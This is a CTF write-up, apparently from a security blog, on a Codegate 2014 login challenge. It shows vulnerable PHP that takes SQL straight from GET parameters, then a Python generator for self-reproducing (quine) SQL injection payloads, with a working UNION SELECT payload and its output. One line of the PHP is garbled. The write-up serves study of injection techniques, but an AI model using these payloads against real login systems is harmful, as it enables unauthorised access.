@@ -1,0 +1,82 @@
+
+6zhd4xvs2rqyqt6e34kzemvksu--www-shysecurity-com.translate.goog
+SQLi-Quine
+kelson@shysecurity.com
+5-6 minutes
+
+This was one of the very interesting challenges brought back for us from the Codegate Finals - sans challenge text. Using a php vuln, a copy of the source code was acquired - here's the relevant piece
+
+<form method=get action="index.php"><div><h1>Login</h1>
+ID <input type=text name=id> PW <input type=text name=pw> <input type=submit value='Submit'> <input type=button onclick=location.href='index.phps' value='Source'>
+</form>
+<?php
+$q=@mysql_fetch_array(mysql_query("select id,pw from mem where id='$_GET[id]'"));
+
+if($_GET['id'] && $_GET['pw'])
+{
+    if(!$q['id']) exit();
+    if(md5($q['id'])==md5($_GET['id']))
+    {
+        echo("<br>hi! ".htmlspecialchars($q['id'])."<br><br>");
+        $q['pw']=trim($q['pw']);
+        $_GET['pw']=trim($_GET['pw']);
+        if(!$q['pw']) exit();
+        if($q['pw'md5==]($_GET['pw'])) { echo("<p class=msg>Password is ????</p>"); }
+        else { echo("<p class=error>Wrong pw</p>"); }
+    }
+}
+?></div>
+
+Providing a valid username and password presumably prints out the flag ("Password is ????") and mysql_query would let us fake that using an SQL injection, but md5($q['id'])==md5($_GET['id']) forces the result ID to exactly match the input ID... and that makes for a tricky challenge in which the SQL injection needs to reproduce itself as output. There is a name for programs that output their own source code though, Quine, and Wikipedia even includes just such an SQL program:
+
+SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine
+
+The SQLi gives a chance to change the password to something we control, but the ID must output the code to do so. We also need to modify the password to something we know; sounds like time to make a Quine Generator for SQL! The example SQL Quine provides a clear structure for making a generator through the indirect ($) replacement method. We can pseudocode the simple replacement as follows:
+
+SELECT $$ AS Quine
+$$ => REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)
+
+SELECT REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$) AS Quine
+$$ => 'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine'
+
+SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine
+
+Unfortunately, we need to include a single quote in the outer command (to escape the current SQL field -> id='%s') and that complicates things, but the double quote provides a nice workaround since we're already replacing double quotes (CHAR(34)) with single quotes (CHAR(39))
+
+SELECT $$ AS Quine, MD5('apples') AS pw--
+$$ => REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)
+
+SELECT REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$) AS Quine, MD5('apples') AS pw--
+$$ => 'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine, MD5("apples") AS pw-- '
+
+SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine, MD5("apples") AS pw-- ',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine, MD5("apples") AS pw-- ') AS Quine, MD5('apples') AS pw--
+
+That's a nice basis for a quick and dirty generator...
+
+def quine(data, debug=True):
+    if debug: print data
+    data = data.replace('$$',"REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)")
+    blob = data.replace('$$','"$"').replace("'",'"')
+    data = data.replace('$$',"'"+blob+"'")
+    if debug: print data
+    return data
+
+
+Example Execution
+
+data = quine("' UNION SELECT $$ AS id,MD5(CHAR(122)) AS pw-- ")
+# ' UNION SELECT $$ AS id,MD5('z') AS pw-- 
+# ' UNION SELECT REPLACE(REPLACE('" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,MD5("z") AS pw-- ',CHAR(34),CHAR(39)),CHAR(36),'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,MD5("z") AS pw-- ') AS id,MD5('z') AS pw-- 
+
+results = execute("select id,pw FROM mem where id='%s'"%data)
+print results[0]
+('\' UNION SELECT REPLACE(REPLACE(\'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,MD5("z") AS pw-- \',CHAR(34),CHAR(39)),CHAR(36),\'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,MD5("z") AS pw-- \') AS id,MD5(\'z\') AS pw-- ', 'fbade9e36a3f36d3d676c1b808451dd7')
+print 'success' if (results[0][0] == data) else 'failure'
+success
+
+Sadly, I couldn't attend the Codegate CTF Finals, but this was a super cool challenge and I hope to see similar creativity in the future!
+
+Code available on Github
+https://translate.google.com/website?sl=auto&tl=en&u=https://github.com/ShySec/CTFs/tree/master/2014/Codegate/loginpage
+- Kelson (kelson @ shysecurity.com)
+
